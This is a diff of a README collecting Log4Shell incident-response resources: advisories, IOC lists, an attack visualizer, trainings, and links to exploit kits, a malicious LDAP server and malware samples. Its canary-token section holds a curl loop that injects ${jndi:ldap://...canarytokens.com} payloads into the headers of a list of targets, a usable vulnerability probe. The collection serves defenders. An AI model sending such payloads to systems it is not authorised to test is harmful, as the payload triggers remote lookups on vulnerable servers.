@@ -19,6 +19,7 @@ This repository contains all gathered resources we used during our Incident Repo
 | https://github.com/NCSC-NL/log4shell/tree/main/software | Netherland CERT - Affected log4j versions |
 | https://logging.apache.org/log4j/2.x/security.html | apache.org - Log4j Security Vulnerabilities |
 | https://twitter.com/marcioalm/status/1470361495405875200?s=09 | Twitter - JNDI-Exploit-Kit targets ANY version of Java! |
+| https://twitter.com/an0n_r0/status/1469643986403008515 | Twitter - BlackHat USA 2016 Talk JNDI/LDAP Manipulation and Remote Code Execution |
 
 ### Mitigations / Fixes
 | URL | Info |
@@ -56,7 +57,9 @@ Source: https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-libr
 | https://github.com/curated-intel/Log4Shell-IOCs | Log4Shell-IOCs |
 | https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes | Log4Shell-Hashses |
 | https://www.virustotal.com/gui/collection/04c6ab336e767ae9caee992902c4f3039ccee24df7458cd7cbaf3182644b3044/iocs | VirusTotal IOCs |
+| https://www.greynoise.io/viz/query/?gnql=tags%3A%22Apache%20Log4j%20RCE%20Attempt%22 | Greynoise.io Attack Visualizer |
 | https://samples.vx-underground.org/samples/Families/Log4J%20Malware/ | Driveby Malware Samples (Password: infected) |
+| https://twitter.com/zom3y3/status/1469508032887414784 | Twitter - Muhstik Botnet |
 
 ### Public Honeypots
 | URL | Info |
@@ -97,6 +100,11 @@ Source: https://twitter.com/ymzkei5/status/1469765165348704256?s=09
 Source: https://twitter.com/ymzkei5/status/1469765165348704256?s=09
 
 #### Canary Token Testing
+
+| URL | Info |
+| --- | --- |
+| https://twitter.com/thinkstcanary/status/1469439743905697797?s=21 | Twitter - Thinkst Canary Advisory |
+
 ```c
 cat targets.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}" -H "X-Api-Version: ${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}" -H "User-Agent: ${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}";done
 ```
@@ -136,3 +144,8 @@ Fire in the hole aka start browsing the web!
 | https://github.com/pimps/JNDI-Exploit-Kit | JNDI-Exploit-Kit |
 | https://github.com/mbechler/marshalsec | marshalsec |
 | https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java | marshalsec malicious LDAP server |
+
+### Trainings
+| URL | Info |
+| https://www.youtube.com/watch?v=7qoPDq41xhQ | YouTube - CVE-2021-44228 - Log4j - MINECRAFT VULNERABLE! (and SO MUCH MORE) |
+| https://tryhackme.com/room/solar | Solar, exploiting log4j |
